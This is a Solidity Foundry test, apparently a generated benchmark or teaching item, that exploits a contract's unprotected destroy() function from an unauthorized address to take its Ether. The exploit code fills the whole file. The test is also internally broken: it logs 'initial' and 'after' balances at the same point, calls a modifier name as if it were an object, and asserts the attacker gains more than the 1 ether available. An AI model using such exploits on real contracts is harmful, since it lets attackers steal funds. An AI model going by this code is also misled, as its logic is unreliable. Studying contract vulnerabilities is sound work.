// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/da51b355-8ab8-447c-9497-f80be5933694_OwnershipBug.sol";

contract TestOwnershipBug is BaseTestWithBalanceLog {
    OwnershipBug target;

    function setUp() public {
        owner = vm.addr(1); // Assuming owner has address 1 for the purposes of testing
        target = new OwnershipBug(owner);
    }

    function testExploit() public balanceLog {
        // Step 1: Deploy a single contract with the vulnerable `destroy()` function
        // This is already done in setUp

        // Step 2: Transfer some Ether to this contract from your student account
        vm.deal(address(target), 1 ether);

        // Setup attacker's address and prank
        address attacker = vm.addr(2);
        vm.prank(attacker);
        
        // Step 3: Call the `destroy()` function from an unauthorized account
        target.destroy();

        // Validation (Step 1)
        assertEq(address(target).balance, 0, "Funds were not destroyed");

        // Add balance for validation (Step 2)
        balanceLog.push(attacker, "Initial Balance", attacker.balance);
        balanceLog.push(attacker, "After Exploit Balance", attacker.balance);

        // Assert that the attacker's balance has increased
        assertGt(attacker.balance, 1 ether, "Attacker did not receive any funds");
    }
}